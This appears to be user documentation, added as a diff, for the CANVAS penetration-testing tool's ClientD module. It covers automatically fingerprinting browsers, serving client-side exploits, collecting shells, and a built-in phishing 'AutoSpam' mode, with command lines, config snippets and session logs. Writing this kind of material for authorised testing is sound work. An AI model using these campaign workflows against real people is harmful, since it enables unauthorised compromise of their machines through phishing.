@@ -1,0 +1,123 @@
+Exploiting Client-Side Vulnerablities
+=====================================
+
+Canvas is well suited to serving and handling client-side attacks in addition to remote attacks. Since there are a wide range and different classications of vulnerablities are supported by CANVAS, the  exploitation methods used by CANVAS are dependent on the type of exploit. In most cases when dealing with client-side vulnerabilities, the vulnerability can be triggered from a web-browser. For these situations, CANVAS provides a dedicated engine for automatically selecting, serving and handling browser based exploits. Vulnerabilities in the browser (IE, Firefox, etc.) or third party plugings (Adobe Reader, Adobe Flash, MS-Office, etc.) are examples of such cases. 
+
+Instead of individually selecting specific modules for each vulnerability, CANVAS has an an automated engine that will fingerprint the client's browser, and based on identified plugins and their versions, deliver one or multiple exploits to the target(s). This process is handled by the ``ClientD`` module, accessible under the ``Servers`` category in Canvas modules tree. 
+
+.. image:: /images/canvas_clientd.png
+
+The ClientD module is capable of handling multiple targets and visitors at the same time, making it an ideal tool for phishing and client-side exploitation campaigns in real-world scenarios and penetration tests. ClientD can be configured and used in multiple ways. In general it works as a simple web server, presenting whatever exploits have been selected to any client accessing it. If more than one exploit module is selected, then for every visitor, ClientD will iterate through the list and serve them to the client one after each other followed by a default session timeout timer. If the *"Automatically Detect Exploits"* option is selected, based on the identified browser and plugins information provided via the ``jsrecon`` module, a number of exploits from the selection list will be delivered to the client. This option is enabled by default, and Canvas is already configured to use a number of reliable and most common vulnerabilities that are available in the Canvas. This can of course be turned off, and configured to specify one or many specific exploits from the list.
+
+The second option *"Always Do Recon"* enforces an is_vulnerable check against the selected list of exploits, so that if ClientD detects that the visitor might not be vulnerable to the selected exploit, it will not be delivered. This feature is quiet useful specially when you want to test multiple vulnerabilities
+against every client and only try the ones that will potentially succeed. On the other hand, some specific client side vulnerabilities such as the ones relying on heap spraying exploitation technique might face with stability issues, due to execution of the ``jsrecon`` module which will change the layout of the heap in the exploited process.
+
+If the automatically detect exploits options is enabled, based on fingerprinted data, ClientD might automatically add exploits to the list, even if they are not selected. Such automatically selected exploits are always tested before the manually selected ones and have a higher priority to be executed. If the *"Always Do Recon"* option is disabled, ClientD will always attempt to run all selected exploits against every target, without performing any checks whether they might be vulnerable or not. 
+
+ClientD was written to allow the concurrent exploitation of multiple clients. It operates on a session id logic that has an associated active module and allowed exploit list. Every active module is a unique instance of a makesploit FSM and the session id logic allows for client session identification. This translates to a HTTP Server that can exploit multiple clients in parallel, with different exploits, in different phases of their exploitation process. This is useful when you expect to own more than one client, or when going after multiple clients that share the same source address (behind NAT or proxy).
+
+
+ClientD Commandline Mode
+^^^^^^^^^^^^^^^^^^^^^^^^
+The ClientD server also allows for full independent commandline usage including multiple shell handling, as it operates with an XMLRPC CommandLine capable instance of the engine. Note that when running clientD from the commandline you can not have a GUI instance of CANVAS running.
+
+Following example shows running the ClientD from the commandline interface:
+
+1.Edit the allow list to your liking and start ClientD, the -l option correlates to the interface you want to receive your callbacks on ::
+
+	$	python ./exploits/server/clientd/clientd.py -l 192.168.1.100
+
+
+2.Wait for clients to connect, ClientD will do its thing in a fully automated fashion ::
+
+	$	192.168.1.102 - - [11/Aug/2009 17:32:36] &quot;GET /SiteException.jar HTTP/1.1&quot; 200 11475
+		[+] got existing session cookie
+		[+] HTTP_SESSION_ID: 1250026340.09
+		[+] HTTP_COOKIE: CANSessID=1250026340.09
+		[+] SERVER_PROTOCOL: HTTP/1.1
+		[+] QUERY_STRING:
+		[+] REQUEST_METHOD: GET
+		[+] HTTP_RAW_HEADERS: ['User-Agent: Mozilla/4.0 (Windows 2000 5.0) Java/1.5.0_04
+		', 'Host: 192.168.1.100:8080
+		', 'Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+		', 'Connection: keep-alive
+		', 'Content-type: application/x-www-form-urlencoded
+		', 'Cookie: CANSessID=1250026340.09
+		']
+		[+] HTTP_CONNECTION: keep-alive
+		[+] BODY_DATA:
+		[+] HTTP_RAW_REQUEST: GET /SiteException.jar HTTP/1.1
+		[+] CONTENT_LENGTH:
+		[+] HTTP_USER_AGENT: Mozilla/4.0 (Windows 2000 5.0) Java/1.5.0_04
+		[+] HTTP_HOST: 192.168.1.100:8080
+		[+] HTTP_ACCEPT: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+		[+] REMOTE_ADDR: 192.168.1.102
+		[+] CONTENT_TYPE: application/x-www-form-urlencoded
+		[+] REMOTE_HOST:
+		[+] PATH_INFO: /SiteException.jar
+		[+] continue existing exploit session for client
+				
+
+3.Reap your shells by attaching to the commandline engine instance with the xmlrpc client (note do NOT shut down the server, this is where your active shells are) ::
+
+		$	work@work-desktop:/media/disk/svn/CANVAS$ python cmdline.py
+			Setting CANVAS session to: default
+			Using 'Reports/default' as base data output directory
+			 _____ _____ _____ _____ _____ _____
+			|     |  _  |   | |  |  |  _  |   __|
+			|   --|     | | | |  |  |     |__   |
+			|_____|__|__|_|___|\___/|__|__|_____|
+			         *** XMLRPC cmdline v0.1 ***
+			<<<CANVAS>>> nodes
+			[+] Listing all active nodes
+			ID: 0 - win32Node:0->0
+			ID: 1 - JavaNode:0->1
+			[+] Listed all active nodes
+			<<<CANVAS>>>
+			...
+
+The above nodes were reaped from 2 different clients on 2 different platforms, browsing to ClientD at the same time. This should scale moderately well (or better than the old httpserver anyways).
+
+
+AutoSpam mode:
+^^^^^^^^^^^^^^^
+ClientD also includes an integrated spamming engine which, when enabled, will automatically generate unique URI's for every target email supplied. When someone clicks that unique URI that session will automatically be associated with the target email sent out from the spammer. This allows for very good clientside-to-target correlation and coverage statistics. Example ::
+
+	$	python26 ./exploits/clientd/clientd -O spam:1 -O server_port:80 -O spam_targets:targets.txt -l remote.ip
+
+This command imports a list of targets from targets.txt, and then spams them a unique URI based on self.mail_from/self.subject/self.spam in the Spammer() object. To use a custom SMTP server, tunnel mail through a local SSH tunnel or setup a SMTP relay specifically to do SPAM, and configure the following options in  ``canvas.conf`` file (they are commented out by default) ::
+
+	$ # preferred smtp server for sending spam
+	    preferred_smtp_host         = localhost
+		preferred_smtp_port         = 1025
+
+
+Subsequent visits from the targeted client/person will then be logged with full target correlation, which looks like the following (details censored) ::
+
+	$	### Client Request @ Wed Aug 26 14:33:16 2009 ###
+		HTTP_COOKIE:'CANSessID=1251311592.55'
+		QUERY_STRING:''
+		REQUEST_METHOD:'GET'
+		HTTP_KEEP_ALIVE:'300'
+		SERVER_PROTOCOL:'HTTP/1.1'
+		...XXX...
+		CONTENT_LENGTH:''
+		HTTP_ACCEPT_CHARSET:'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
+		HTTP_USER_AGENT:'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.13) Gecko/XXX XXX/XXX (XXX) Firefox/XXX'
+		HTTP_CONNECTION:'keep-alive'
+		HTTP_RAW_REQUEST:'GET /index.html HTTP/1.1
+		'
+		REMOTE_ADDR:'72.28.155.218'
+		BODY_DATA:''
+		HTTP_SESSION_ID:'1251311592.55'
+		HTTP_HOST:'72.46.249.24'
+		HTTP_ACCEPT:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+		HTTP_ACCEPT_LANGUAGE:'en-us,en;q=0.5'
+		CONTENT_TYPE:'text/plain'
+		SESSION_TARGET:'bas@immunityinc.com'
+		REMOTE_HOST:''
+		HTTP_ACCEPT_ENCODING:'gzip,deflate'
+
+The SESSION_TARGET variable for every request in that session will be associated with the originally targeted email that supplied the URI from which the session was initiated.
+
+.. tip:: When choosing the exploits to try against your targets, it is always better to prioritize testing for more reliable exploits that trigger vulnerabilities that are not based on memory corruption. Java (JRE) browser plugin exploits in CANVAS are a great example. It is not uncommon to see outdated JRE plugins in enterprise networks. Another module that is often successful is the 'generic_java_applet' which requires users to accept a warning prompt of running untrusted Java applet from the browser.
